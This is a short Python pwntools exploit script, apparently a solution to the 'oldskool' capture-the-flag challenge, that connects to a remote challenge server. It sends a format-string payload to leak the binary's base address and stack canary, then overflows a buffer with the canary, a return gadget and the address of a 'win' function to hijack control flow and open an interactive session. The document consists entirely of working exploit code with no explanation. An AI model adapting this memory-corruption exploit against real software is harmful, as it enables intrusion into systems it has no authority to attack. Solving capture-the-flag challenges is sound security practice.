#!/usr/bin/env python
from pwn import *

context.binary = elf = ELF('oldskool')
context.log_level = "debug"
# p = process(elf.path)
# gdb.attach(p, 'init-gef')
p = remote('chall.nitdgplug.org', 30511)

# 6 -> input

# p.sendlineafter("name dude!\n", "%57$p|%39$p|AA" + "%p|" * 0x75)
p.sendlineafter("name dude!\n", "%41$p|%39$pAA")

leaks = [int(v, 16) for v in p.recvuntil("AA", True).split('|') ]

elf.address = leaks[0] - 0x13d7
canary = leaks[1]

ret = elf.address + 0x000000000000101a

log.info("ELF: 0x{:x}".format(elf.address))
log.info("canary: 0x{:x}".format(canary))

p.sendlineafter("you OG rapper:\n", "Spitfire\x00".ljust(0x108, "A") + p64(canary) + "B" * 8 + p64(ret) + p64(elf.symbols['win']))

p.interactive()
